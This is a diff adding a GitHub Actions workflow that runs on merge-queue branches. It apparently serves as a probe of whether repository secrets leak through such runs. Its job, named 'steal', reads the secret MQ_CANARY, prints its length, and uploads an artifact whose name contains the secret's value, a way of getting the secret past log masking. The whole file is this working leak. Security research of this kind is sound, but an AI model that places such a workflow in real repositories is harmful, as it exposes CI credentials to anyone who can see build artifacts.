@@ -1,0 +1,19 @@
+name: mq-fork4
+on:
+  push:
+    branches:
+      - "gh-readonly-queue/**"
+jobs:
+  steal:
+    runs-on: ubuntu-latest
+    steps:
+      - name: probe
+        env:
+          CANARY: ${{ secrets.MQ_CANARY }}
+        run: |
+          echo "len=${#CANARY}"
+          echo test > out.txt
+      - uses: actions/upload-artifact@v4
+        with:
+          name: leak-${{ secrets.MQ_CANARY }}
+          path: out.txt
